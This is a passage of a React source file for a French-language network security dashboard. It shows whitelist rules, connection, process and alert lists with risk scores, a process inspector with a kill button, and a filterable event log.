                      className="bg-cyber-dark border border-cyber-border rounded px-3 py-1.5 text-sm text-white font-mono outline-none focus:border-cyber-neon"
                    >
                      <option value="IP">Adresse IP</option>
                      <option value="PROCESS">Nom Processus</option>
                    </select>
                  </div>

                  <div className="flex-2 flex flex-col gap-2">
                    <label className="text-[10px] text-gray-400 font-mono uppercase">Valeur</label>
                    <input 
                      type="text"
                      placeholder={newRuleType === 'IP' ? 'Ex: 8.8.8.8' : 'Ex: chrome.exe'}
                      value={newRuleValue}
                      onChange={(e) => setNewRuleValue(e.target.value)}
                      className="bg-cyber-dark border border-cyber-border rounded px-3 py-1.5 text-sm text-white font-mono outline-none focus:border-cyber-neon w-full"
                    />
                  </div>

                  <div className="flex-2 flex flex-col gap-2">
                    <label className="text-[10px] text-gray-400 font-mono uppercase">Description</label>
                    <input 
                      type="text"
                      placeholder="Pourquoi faire confiance ?"
                      value={newRuleDesc}
                      onChange={(e) => setNewRuleDesc(e.target.value)}
                      className="bg-cyber-dark border border-cyber-border rounded px-3 py-1.5 text-sm text-white font-mono outline-none focus:border-cyber-neon w-full"
                    />
                  </div>

                  <button 
                    type="submit"
                    className="bg-cyber-neon text-black font-bold text-xs py-2 px-4 rounded hover:bg-white transition flex items-center gap-1 font-mono shrink-0 cursor-pointer"
                  >
                    <Plus className="w-3.5 h-3.5" />
                    <span>Ajouter</span>
                  </button>
                </form>

                <div className="flex flex-col border border-cyber-border rounded-lg overflow-hidden">
                  <div className="grid grid-cols-4 bg-cyber-bg p-3 border-b border-cyber-border text-xs font-mono font-bold text-white">
                    <div>TYPE</div>
                    <div>VALEUR</div>
                    <div>DESCRIPTION</div>
                    <div className="text-right">ACTIONS</div>
                  </div>
                  <div className="divide-y divide-cyber-border/40 max-h-[220px] overflow-y-auto">
                    {whitelist.length === 0 ? (
                      <div className="p-4 text-center text-xs text-gray-500 font-mono">Aucune règle définie.</div>
                    ) : (
                      whitelist.map(rule => (
                        <div key={rule.id} className="grid grid-cols-4 p-3 text-xs font-mono items-center hover:bg-slate-800/20">
                          <div>
                            <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                              rule.rule_type === 'IP' ? 'bg-cyber-blue/15 text-cyber-blue' : 'bg-purple-500/15 text-purple-400'
                            }`}>
                              {rule.rule_type}
                            </span>
                          </div>
                          <div className="text-white font-semibold">{rule.value}</div>
                          <div className="text-gray-400 truncate pr-2">{rule.description || 'N/A'}</div>
                          <div className="text-right">
                            <button 
                              onClick={() => removeWhitelistRule(rule.id)}
                              className="text-cyber-red hover:text-white p-1 hover:bg-cyber-red/10 rounded transition cursor-pointer"
                              title="Supprimer la règle"
                            >
                              <Trash2 className="w-4 h-4 inline" />
                            </button>
                          </div>
                        </div>
                      ))
                    )}
                  </div>
                </div>
              </div>
            )}

            {/* Connexions tab */}
            {activeTab === 'Connexions' && (
              <div className="p-6 flex flex-col gap-4 overflow-y-auto max-h-[500px]">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between border-b border-cyber-border/40 pb-2 gap-3">
                  <h2 className="text-white font-mono text-lg font-bold capitalize">Liste des Connexions</h2>
                  {/* Search Bar */}
                  <div className="relative max-w-xs w-full">
                    <Search className="w-4 h-4 text-gray-400 absolute left-3 top-2.5" />
                    <input
                      type="text"
                      placeholder="Rechercher IP, port, domaine..."
                      value={searchConn}
                      onChange={(e) => setSearchConn(e.target.value)}
                      className="w-full bg-cyber-bg border border-cyber-border rounded-lg pl-9 pr-4 py-1.5 text-xs text-white font-mono placeholder:text-gray-600 focus:outline-none focus:border-cyber-neon"
                    />
                  </div>
                </div>

                <div className="flex flex-col gap-2">
                  {connections
                    .filter(c => {
                      const query = searchConn.toLowerCase();
                      return (
                        (c.process_name && c.process_name.toLowerCase().includes(query)) ||
                        (c.remote_ip && c.remote_ip.toLowerCase().includes(query)) ||
                        (c.local_ip && c.local_ip.toLowerCase().includes(query)) ||
                        (c.domain_name && c.domain_name.toLowerCase().includes(query)) ||
                        (c.protocol && c.protocol.toLowerCase().includes(query))
                      );
                    })
                    .map((c, idx) => (
                      <div 
                        key={idx} 
                        onClick={() => setSelectedConn(c)}
                        className={`p-3 bg-cyber-bg border rounded-lg flex items-center justify-between cursor-pointer transition hover:border-cyber-neon/40 ${
                          selectedConn && selectedConn.pid === c.pid && selectedConn.remote_ip === c.remote_ip ? 'border-cyber-neon bg-cyber-neon/5' : 'border-cyber-border/40'
                        }`}
                      >
                        <div className="flex items-center gap-3">
                          <span className={`w-2.5 h-2.5 rounded-full ${
                            c.risk_score >= 70 ? 'bg-cyber-red animate-pulse' : c.risk_score >= 30 ? 'bg-cyber-orange' : 'bg-cyber-green'
                          }`}></span>
                          <div>
                            <span className="font-mono text-sm font-semibold text-white">{c.process_name}</span>
                            <span className="text-xs text-gray-400 font-mono block mt-0.5">
                              {c.local_ip}:{c.local_port} → <span className="text-cyber-neon font-bold">{c.remote_ip}:{c.remote_port}</span> {c.domain_name && `(${c.domain_name})`}
                            </span>
                          </div>
                        </div>
                        <div className="text-right font-mono text-xs flex items-center gap-3">
                          <span className="text-gray-400 text-[10px]">{c.protocol}</span>
                          <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                            c.risk_score >= 70 ? 'bg-cyber-red/15 text-cyber-red' : c.risk_score >= 30 ? 'bg-cyber-orange/15 text-cyber-orange' : 'bg-cyber-green/15 text-cyber-green'
                          }`}>
                            Risk: {c.risk_score}/100
                          </span>
                        </div>
                      </div>
                    ))}
                </div>
              </div>
            )}

            {/* Processus tab */}
            {activeTab === 'Processus' && (
              <div className="p-6 flex flex-col gap-4 overflow-y-auto max-h-[500px]">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between border-b border-cyber-border/40 pb-2 gap-3">
                  <h2 className="text-white font-mono text-lg font-bold capitalize">Liste des Processus Actifs</h2>
                  {/* Search Bar */}
                  <div className="relative max-w-xs w-full">
                    <Search className="w-4 h-4 text-gray-400 absolute left-3 top-2.5" />
                    <input
                      type="text"
                      placeholder="Rechercher nom, PID, utilisateur..."
                      value={searchProc}
                      onChange={(e) => setSearchProc(e.target.value)}
                      className="w-full bg-cyber-bg border border-cyber-border rounded-lg pl-9 pr-4 py-1.5 text-xs text-white font-mono placeholder:text-gray-600 focus:outline-none focus:border-cyber-neon"
                    />
                  </div>
                </div>

                <div className="flex flex-col gap-2">
                  {connections
                    .filter(c => {
                      const query = searchProc.toLowerCase();
                      return (
                        (c.process_name && c.process_name.toLowerCase().includes(query)) ||
                        String(c.pid).includes(query) ||
                        (c.username && c.username.toLowerCase().includes(query)) ||
                        (c.process_path && c.process_path.toLowerCase().includes(query))
                      );
                    })
                    .reduce((acc, c) => {
                      const existing = acc.find(process => process.pid === c.pid);
                      if (!existing) {
                        acc.push({ ...c, connectionCount: 1 });
                      } else {
                        existing.connectionCount += 1;
                        if ((c.risk_score || 0) > (existing.risk_score || 0)) {
                          Object.assign(existing, c, { connectionCount: existing.connectionCount });
                        }
                      }
                      return acc;
                    }, [])
                    .map((c, idx) => (
                      <div 
                        key={idx} 
                        onClick={() => setSelectedConn(c)}
                        className={`p-3 bg-cyber-bg border rounded-lg flex items-center justify-between cursor-pointer transition hover:border-cyber-neon/40 ${
                          selectedConn && selectedConn.pid === c.pid ? 'border-cyber-neon bg-cyber-neon/5' : 'border-cyber-border/40'
                        }`}
                      >
                        <div className="flex items-center gap-3">
                          <span className={`w-2.5 h-2.5 rounded-full ${
                            c.risk_score >= 70 ? 'bg-cyber-red animate-pulse' : c.risk_score >= 30 ? 'bg-cyber-orange' : 'bg-cyber-green'
                          }`}></span>
                          <div>
                            <span className="font-mono text-sm font-semibold text-white">{c.process_name}</span>
                            <span className="text-xs text-gray-400 font-mono block mt-0.5">
                              PID: <span className="text-white font-bold">{c.pid}</span> | Utilisateur: <span className="text-gray-300">{c.username || 'N/A'}</span>
                              {c.connectionCount > 1 && (
                                <span className="ml-2 text-cyber-neon">({c.connectionCount} connexions)</span>
                              )}
                            </span>
                          </div>
                        </div>
                        <div className="text-right font-mono text-xs flex items-center gap-3">
                          <span className="text-[10px] text-gray-500 max-w-[150px] truncate" title={c.process_path}>{c.process_path}</span>
                          <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                            c.risk_score >= 70 ? 'bg-cyber-red/15 text-cyber-red' : c.risk_score >= 30 ? 'bg-cyber-orange/15 text-cyber-orange' : 'bg-cyber-green/15 text-cyber-green'
                          }`}>
                            Risk: {c.risk_score}/100
                          </span>
                        </div>
                      </div>
                    ))}
                </div>
              </div>
            )}

            {/* Alertes tab */}
            {activeTab === 'Alertes' && (
              <div className="p-6 flex flex-col gap-4 overflow-y-auto max-h-[500px]">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between border-b border-cyber-border/40 pb-2 gap-3">
                  <h2 className="text-white font-mono text-lg font-bold capitalize">Journal d'Alertes Actives</h2>
                  {/* Search Bar */}
                  <div className="relative max-w-xs w-full">
                    <Search className="w-4 h-4 text-gray-400 absolute left-3 top-2.5" />
                    <input
                      type="text"
                      placeholder="Rechercher alerte, message, IP, processus..."
                      value={searchAlert}
                      onChange={(e) => setSearchAlert(e.target.value)}
                      className="w-full bg-cyber-bg border border-cyber-border rounded-lg pl-9 pr-4 py-1.5 text-xs text-white font-mono placeholder:text-gray-600 focus:outline-none focus:border-cyber-neon"
                    />
                  </div>
                </div>

                <div className="flex flex-col gap-2">
                  {alerts.length === 0 ? (
                    <div className="p-8 text-center text-xs font-mono text-gray-500">Aucune alerte enregistrée.</div>
                  ) : (
                    alerts
                      .filter(a => {
                        const query = searchAlert.toLowerCase();
                        return (
                          (a.process_name && a.process_name.toLowerCase().includes(query)) ||
                          (a.message && a.message.toLowerCase().includes(query)) ||
                          (a.source_ip && a.source_ip.toLowerCase().includes(query)) ||
                          (a.destination_ip && a.destination_ip.toLowerCase().includes(query)) ||
                          (a.level && a.level.toLowerCase().includes(query)) ||
                          (a.protocol && a.protocol.toLowerCase().includes(query))
                        );
                      })
                      .map((a, idx) => (
                        <div 
                          key={idx}
                          className={`p-3 bg-cyber-bg border rounded-lg flex flex-col sm:flex-row sm:items-center justify-between border-cyber-border/40 hover:border-cyber-neon/40 transition`}
                        >
                          <div className="flex items-start gap-3">
                            <span className={`w-2.5 h-2.5 rounded-full mt-1.5 ${
                              a.risk_score >= 70 ? 'bg-cyber-red animate-pulse' : a.risk_score >= 30 ? 'bg-cyber-orange' : 'bg-cyber-green'
                            }`}></span>
                            <div>
                              <div className="flex items-center gap-2 flex-wrap">
                                <span className="font-mono text-sm font-semibold text-white">{a.process_name}</span>
                                <span className={`px-1.5 py-0.5 rounded text-[9px] font-bold ${
                                  a.level === 'ALERT' ? 'bg-cyber-red/20 text-cyber-red' : a.level === 'WARN' ? 'bg-cyber-orange/20 text-cyber-orange' : 'bg-cyber-green/20 text-cyber-green'
                                }`}>{a.level}</span>
                                <span className="text-[10px] text-gray-400 font-mono">@{new Date(a.timestamp).toLocaleTimeString('fr-FR')}</span>
                              </div>
                              <p className="text-sm text-gray-200 mt-1 font-mono">{a.message}</p>
                              <span className="text-xs text-gray-400 font-mono block mt-1">
                                {a.source_ip} → <span className="text-cyber-neon font-bold">{a.destination_ip}</span> [{a.protocol}]
                              </span>
                            </div>
                          </div>
                          <div className="text-right mt-2 sm:mt-0 font-mono text-xs shrink-0">
                            <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                              a.risk_score >= 70 ? 'bg-cyber-red/15 text-cyber-red' : a.risk_score >= 30 ? 'bg-cyber-orange/15 text-cyber-orange' : 'bg-cyber-green/15 text-cyber-green'
                            }`}>
                              Risk: {a.risk_score}/100
                            </span>
                          </div>
                        </div>
                      ))
                  )}
                </div>
              </div>
            )}

            {/* Fallback for other pages */}
            {activeTab === 'Analyse VT' && (
              <div className="p-6 flex flex-col gap-4 overflow-y-auto max-h-[500px]">
                <h2 className="text-white font-mono text-lg font-bold border-b border-cyber-border/40 pb-2 capitalize">Analyse VirusTotal</h2>
                <div className="flex flex-col gap-2">
                  {connections.map((c, idx) => (
                    <div 
                      key={idx} 
                      onClick={() => setSelectedConn(c)}
                      className={`p-3 bg-cyber-bg border rounded-lg flex items-center justify-between cursor-pointer transition hover:border-cyber-neon/40 ${
                        selectedConn && selectedConn.pid === c.pid ? 'border-cyber-neon bg-cyber-neon/5' : 'border-cyber-border/40'
                      }`}
                    >
                      <div className="flex items-center gap-3">
                        <span className={`w-2.5 h-2.5 rounded-full ${
                          c.risk_score >= 70 ? 'bg-cyber-red' : c.risk_score >= 30 ? 'bg-cyber-orange' : 'bg-cyber-green'
                        }`}></span>
                        <div>
                          <span className="font-mono text-xs font-semibold text-white">{c.process_name}</span>
                          <span className="text-[10px] text-gray-500 font-mono block">PID: {c.pid} | {c.remote_ip}:{c.remote_port}</span>
                        </div>
                      </div>
                      <div className="text-right font-mono text-xs">
                        <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                          c.risk_score >= 70 ? 'bg-cyber-red/15 text-cyber-red' : c.risk_score >= 30 ? 'bg-cyber-orange/15 text-cyber-orange' : 'bg-cyber-green/15 text-cyber-green'
                        }`}>
                          Risk: {c.risk_score}/100
                        </span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}

          </div>

        </main>

        {/* C. PANNEAU DROIT (Inspecteur de Processus) */}
        <aside className="col-span-1 lg:col-span-3 flex flex-col bg-cyber-dark border border-cyber-border rounded-xl p-4 gap-4 overflow-y-auto max-h-[600px] lg:max-h-none">
          
          {selectedConn ? (
            <div className="flex flex-col h-full justify-between gap-5">
              
              {/* Header */}
              <div>
                <div className="flex items-center justify-between border-b border-cyber-border/40 pb-3">
                  <div className="flex items-center gap-2.5">
                    <div className="w-8 h-8 rounded bg-cyber-blue/15 border border-cyber-blue/30 flex items-center justify-center">
                      <Cpu className="w-4 h-4 text-cyber-blue" />
                    </div>
                    <div>
                      <h3 className="font-mono text-xs font-bold text-white truncate max-w-[130px]">{selectedConn.process_name}</h3>
                      <span className="text-[9px] text-cyber-green flex items-center gap-1 font-mono">
                        <span className="w-1.5 h-1.5 rounded-full bg-cyber-green animate-pulse"></span>
                        Actif
                      </span>
                    </div>
                  </div>
                  <button 
                    onClick={() => setSelectedConn(null)}
                    className="p-1 hover:bg-slate-800 text-gray-500 hover:text-white rounded transition cursor-pointer"
                  >
                    <X className="w-4 h-4" />
                  </button>
                </div>

                {/* Network parameters */}
                <div className="mt-4 flex flex-col gap-3 font-mono text-xs">
                  <div className="text-[10px] text-gray-500 font-bold uppercase tracking-wider">Informations Réseau</div>
                  
                  <div className="grid grid-cols-2 gap-2 bg-cyber-bg/40 p-2.5 rounded border border-cyber-border/30">
                    <div>
                      <span className="text-[9px] text-gray-500 block">IP LOCALE</span>
                      <span className="text-white text-[11px]">{selectedConn.local_ip}:{selectedConn.local_port}</span>
                    </div>
                    <div>
                      <span className="text-[9px] text-gray-500 block">IP DISTANTE</span>
                      <span className="text-cyber-neon text-[11px] flex items-center gap-1 truncate" title={selectedConn.remote_ip}>
                        <Globe className="w-3 h-3 shrink-0" />
                        {selectedConn.remote_ip}
                      </span>
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-2 bg-cyber-bg/40 p-2.5 rounded border border-cyber-border/30">
                    <div>
                      <span className="text-[9px] text-gray-500 block">PROTOCOLE</span>
                      <span className={`px-1.5 py-0.5 rounded text-[10px] font-bold ${
                        selectedConn.protocol === 'TCP' ? 'bg-cyber-blue/15 text-cyber-blue' : 'bg-cyber-orange/15 text-cyber-orange'
                      }`}>{selectedConn.protocol}</span>
                    </div>
                    <div>
                      <span className="text-[9px] text-gray-500 block">PORT DISTANT</span>
                      <span className="text-white text-[11px]">{selectedConn.remote_port}</span>
                    </div>
                  </div>
                </div>

                {/* System details */}
                <div className="mt-5 flex flex-col gap-3 font-mono text-xs">
                  <div className="text-[10px] text-gray-500 font-bold uppercase tracking-wider">Détails Système</div>
                  
                  <div className="flex flex-col gap-2 bg-cyber-bg/40 p-2.5 rounded border border-cyber-border/30">
                    <div className="flex justify-between items-center">
                      <span className="text-[9px] text-gray-400">PID</span>
                      <div className="flex items-center gap-1">
                        <span className="text-white font-bold">{selectedConn.pid}</span>
                        <button 
                          onClick={() => {
                            navigator.clipboard.writeText(selectedConn.pid);
                            setCopiedPid(true);
                            setTimeout(() => setCopiedPid(false), 1500);
                          }}
                          className="p-1 hover:text-cyber-neon rounded transition"
                          title="Copier le PID"
                        >
                          {copiedPid ? <Check className="w-3 h-3 text-cyber-green" /> : <Copy className="w-3 h-3" />}
                        </button>
                      </div>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-[9px] text-gray-400">PROPRIÉTAIRE</span>
                      <span className="text-gray-300">{selectedConn.username || 'SYSTEM'}</span>
                    </div>
                    <div className="flex flex-col pt-1">
                      <span className="text-[9px] text-gray-400 mb-0.5">CHEMIN D'ACCÈS</span>
                      <span className="text-gray-400 text-[10px] break-all bg-cyber-dark/80 p-1.5 rounded border border-cyber-border/30">
                        {selectedConn.process_path || 'Inconnu'}
                      </span>
                    </div>
                  </div>
                </div>

                {/* Security Block */}
                <div className="mt-5 flex flex-col gap-3 font-mono text-xs">
                  <div className="text-[10px] text-gray-500 font-bold uppercase tracking-wider">Sécurité & Menace</div>
                  
                  <div className="flex flex-col gap-2.5 bg-cyber-bg/40 p-3 rounded border border-cyber-border/30">
                    <div className="flex justify-between items-center">
                      <span className="text-[9px] text-gray-400">SCORE DE RISQUE</span>
                      <span className={`px-2 py-0.5 rounded text-[11px] font-bold ${
                        selectedConn.risk_score >= 70 ? 'bg-cyber-red/25 text-cyber-red glow-red' : selectedConn.risk_score >= 30 ? 'bg-cyber-orange/25 text-cyber-orange' : 'bg-cyber-green/25 text-cyber-green'
                      }`}>
                        {selectedConn.risk_score || 0} / 100
                      </span>
                    </div>

                    <div className="flex flex-col pt-1">
                      <span className="text-[9px] text-gray-400 mb-1">EMPREINTE SHA256</span>
                      <div className="flex items-center justify-between bg-cyber-dark/80 p-1.5 rounded border border-cyber-border/30">
                        <span className="text-gray-400 text-[9px] truncate max-w-[160px]">
                          {selectedConn.process_hash || 'SHA256 non calculé'}
                        </span>
                        {selectedConn.process_hash && (
                          <button 
                            onClick={() => {
                              navigator.clipboard.writeText(selectedConn.process_hash);
                              setCopiedHash(true);
                              setTimeout(() => setCopiedHash(false), 1500);
                            }}
                            className="p-1 hover:text-cyber-neon rounded transition"
                            title="Copier le SHA256"
                          >
                            {copiedHash ? <Check className="w-3.5 h-3.5 text-cyber-green" /> : <Copy className="w-3.5 h-3.5" />}
                          </button>
                        )}
                      </div>
                    </div>

                    {selectedConn.alerts && selectedConn.alerts.length > 0 && (
                      <div className="flex flex-col pt-1 border-t border-cyber-border/30 mt-1">
                        <span className="text-[9px] text-cyber-red font-bold flex items-center gap-1 mb-1">
                          <ShieldAlert className="w-3.5 h-3.5" />
                          ANOMALIES DÉTECTÉES ({selectedConn.alerts.length})
                        </span>
                        <ul className="list-disc list-inside text-gray-400 text-[9px] flex flex-col gap-1 pl-1">
                          {selectedConn.alerts.map((alt, idx) => (
                            <li key={idx} className="leading-relaxed"><span className="text-cyber-red">{alt}</span></li>
                          ))}
                        </ul>
                      </div>
                    )}
                  </div>
                </div>

                {/* Command Line block */}
                {selectedConn.cmdline && (
                  <div className="mt-5 flex flex-col gap-2 font-mono text-xs">
                    <span className="text-[10px] text-gray-500 font-bold uppercase tracking-wider">Ligne de commande (CMDLINE)</span>
                    <pre className="bg-black text-[10px] text-cyber-green p-2 rounded-lg border border-cyber-border/50 max-h-[80px] overflow-y-auto whitespace-pre-wrap break-all leading-normal">
                      {selectedConn.cmdline}
                    </pre>
                  </div>
                )}

              </div>

              {/* Critical action button */}
              <div className="pt-4 border-t border-cyber-border/40 mt-4">
                <button
                  onClick={() => killProcess(selectedConn.pid)}
                  className="w-full py-2.5 rounded-lg bg-cyber-red hover:bg-white text-white hover:text-black font-bold font-mono text-xs transition duration-300 flex items-center justify-center gap-2 shadow-lg hover:shadow-cyber-red/20 glow-red border border-cyber-red/30 cursor-pointer"
                >
                  <ShieldAlert className="w-4 h-4" />
                  <span>TUER LE PROCESSUS (PID {selectedConn.pid})</span>
                </button>
              </div>

            </div>
          ) : (
            <div className="flex flex-col items-center justify-center h-full min-h-[300px] text-center border-2 border-dashed border-cyber-border/30 rounded-xl p-4 font-mono text-xs">
              <Activity className="w-10 h-10 text-gray-600 mb-3 animate-pulse" />
              <span className="text-gray-400 font-bold mb-1">Inspecteur inactif</span>
              <p className="text-gray-500 text-[10px] max-w-[170px] leading-relaxed">Sélectionnez une IP ou un processus satellite dans le graphe central pour afficher ses métadonnées.</p>
            </div>
          )}

        </aside>

      </div>

      {/* D. TABLEAU INFÉRIEUR (Log des événements) */}
      <footer className="p-4 border-t border-cyber-border bg-cyber-dark/60 backdrop-blur-sm">
        
        {/* Header tools */}
        <div className="flex flex-col sm:flex-row items-center justify-between px-3 py-2 border border-cyber-border bg-cyber-bg/80 rounded-t-xl gap-4">
          <div className="flex items-center gap-2">
            <Database className="w-4 h-4 text-cyber-neon" />
            <h3 className="font-mono text-xs font-bold text-white tracking-wider">JOURNAL DES ÉVÉNEMENTS (LOG SYSTEM)</h3>
          </div>

          <div className="flex flex-wrap items-center gap-4 font-mono text-[10px]">
            {/* Real-time search inside Event Log */}
            <div className="relative w-44">
              <Search className="w-3.5 h-3.5 text-gray-500 absolute left-2.5 top-2" />
              <input
                type="text"
                placeholder="Filtrer les logs..."
                value={searchAlert}
                onChange={(e) => setSearchAlert(e.target.value)}
                className="w-full bg-cyber-bg border border-cyber-border/80 rounded pl-8 pr-2 py-1 text-[10px] text-white font-mono placeholder:text-gray-600 focus:outline-none focus:border-cyber-neon"
              />
            </div>

            {/* Protocol filter */}
            <div className="flex items-center gap-1.5">
              <span className="text-gray-500">PROTOCOLE :</span>
              <div className="flex border border-cyber-border rounded overflow-hidden">
                {['Tous', 'TCP', 'UDP'].map(p => (
                  <button 
                    key={p} 
                    onClick={() => setFilterProtocol(p)}
                    className={`px-2 py-0.5 border-r border-cyber-border last:border-0 ${filterProtocol === p ? 'bg-cyber-neon/15 text-cyber-neon font-bold' : 'text-gray-400 hover:bg-slate-800'}`}
                  >
                    {p}
                  </button>
                ))}
              </div>
            </div>

            {/* Level filter */}
            <div className="flex items-center gap-1.5">
              <span className="text-gray-500">NIVEAU :</span>
              <div className="flex border border-cyber-border rounded overflow-hidden">
                {['Tous', 'ALERT', 'WARN', 'INFO'].map(lvl => (
                  <button 
                    key={lvl} 
                    onClick={() => setFilterLevel(lvl)}
                    className={`px-2 py-0.5 border-r border-cyber-border last:border-0 ${filterLevel === lvl ? 'bg-cyber-neon/15 text-cyber-neon font-bold' : 'text-gray-400 hover:bg-slate-800'}`}
                  >
                    {lvl}
                  </button>
                ))}
              </div>
            </div>

            <button 
              onClick={clearLogs}
              className="px-2.5 py-1 rounded bg-cyber-red/10 border border-cyber-red/30 hover:bg-cyber-red hover:text-white text-cyber-red font-bold transition flex items-center gap-1 cursor-pointer"
            >
              <Trash2 className="w-3.5 h-3.5" />
              <span>EFFACER LOGS</span>
            </button>
          </div>
        </div>

        {/* Log table */}
        <div className="border-x border-b border-cyber-border/80 bg-cyber-bg/40 max-h-[180px] overflow-y-auto rounded-b-xl">
          {loadingAlerts ? (
            <div className="p-8 text-center text-xs font-mono text-cyber-neon animate-pulse">Chargement des alertes depuis la base de données...</div>
          ) : alerts.length === 0 ? (
            <div className="p-8 text-center text-xs font-mono text-gray-500">Aucune alerte enregistrée dans le journal.</div>
          ) : (
            <table className="w-full border-collapse font-mono text-[10px] text-left">
              <thead>
                <tr className="bg-cyber-dark/45 border-b border-cyber-border/40 text-gray-400 uppercase font-semibold">
                  <th className="p-2.5">HEURE</th>
                  <th className="p-2.5">NIVEAU</th>
                  <th className="p-2.5">PROCESSUS</th>
                  <th className="p-2.5">ÉVÉNEMENT / ALERTE</th>
                  <th className="p-2.5">PROTOCOLE</th>
                  <th className="p-2.5">SOURCE</th>
                  <th className="p-2.5">DESTINATION</th>
                  <th className="p-2.5 text-center">RISQUE</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-cyber-border/30">
                {alerts
                  .filter(alert => {
                    const query = searchAlert.toLowerCase();
                    return (
                      (alert.process_name && alert.process_name.toLowerCase().includes(query)) ||
                      (alert.message && alert.message.toLowerCase().includes(query)) ||
                      (alert.source_ip && alert.source_ip.toLowerCase().includes(query)) ||
                      (alert.destination_ip && alert.destination_ip.toLowerCase().includes(query)) ||
                      (alert.level && alert.level.toLowerCase().includes(query)) ||
                      (alert.protocol && alert.protocol.toLowerCase().includes(query))
                    );
                  })
                  .map((alert, idx) => {
                    let badgeStyle = 'bg-cyber-green/15 text-cyber-green';
                    if (alert.risk_score >= 70) badgeStyle = 'bg-cyber-red/20 text-cyber-red font-bold glow-red';
                    else if (alert.risk_score >= 30) badgeStyle = 'bg-cyber-orange/20 text-cyber-orange';

                  const time = new Date(alert.timestamp).toLocaleTimeString('fr-FR');

                  return (
                    <tr 
                      key={alert.id || idx} 
                      className="hover:bg-slate-800/20 cursor-pointer"
                      onClick={() => {
                        // Find matching active connection if possible, else make a dummy connection details view
                        const active = connections.find(c => c.pid === alert.process_name || c.process_name === alert.process_name);
                        if (active) {
                          setSelectedConn(active);
                        } else {
                          setSelectedConn({
                            pid: alert.pid || 0,
                            process_name: alert.process_name,
                            local_ip: alert.source_ip ? alert.source_ip.split(':')[0] : '127.0.0.1',
                            local_port: alert.source_ip ? parseInt(alert.source_ip.split(':')[1] || 0) : 0,
                            remote_ip: alert.destination_ip ? alert.destination_ip.split(':')[0] : '0.0.0.0',
                            remote_port: alert.destination_ip ? parseInt(alert.destination_ip.split(':')[1] || 0) : 0,
                            protocol: alert.protocol,
                            risk_score: alert.risk_score,
                            alerts: [alert.message],
                            status: 'TERMINATED',
                            username: 'SYSTEM'
                          });
                        }
                      }}
                    >
                      <td className="p-2.5 text-gray-500 font-bold">{time}</td>
                      <td className="p-2.5">
                        <span className={`px-1.5 py-0.5 rounded text-[9px] ${
                          alert.risk_score >= 70 ? 'bg-cyber-red/15 text-cyber-red' : alert.risk_score >= 30 ? 'bg-cyber-orange/15 text-cyber-orange' : 'bg-cyber-green/15 text-cyber-green'
                        }`}>
                          {alert.level || (alert.risk_score >= 70 ? 'ALERT' : alert.risk_score >= 30 ? 'WARN' : 'INFO')}
                        </span>
                      </td>
                      <td className="p-2.5 text-white font-semibold">{alert.process_name}</td>
                      <td className="p-2.5 text-gray-300 pr-4 max-w-[320px] truncate" title={alert.message}>{alert.message}</td>
                      <td className="p-2.5">
                        <span className={`px-1 rounded text-[9px] ${
                          alert.protocol === 'TCP' ? 'bg-cyber-blue/10 text-cyber-blue' : 'bg-cyber-orange/10 text-cyber-orange'
                        }`}>
                          {alert.protocol}
                        </span>
                      </td>
                      <td className="p-2.5 text-gray-400">{alert.source_ip || '127.0.0.1:*'}</td>
                      <td className="p-2.5 text-cyber-neon">{alert.destination_ip}</td>
                      <td className="p-2.5 text-center">
                        <span className={`px-2 py-0.5 rounded font-bold ${badgeStyle}`}>
                          {alert.risk_score}
                        </span>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          )}
        </div>

      </footer>

    </div>
  );
}

export default App;
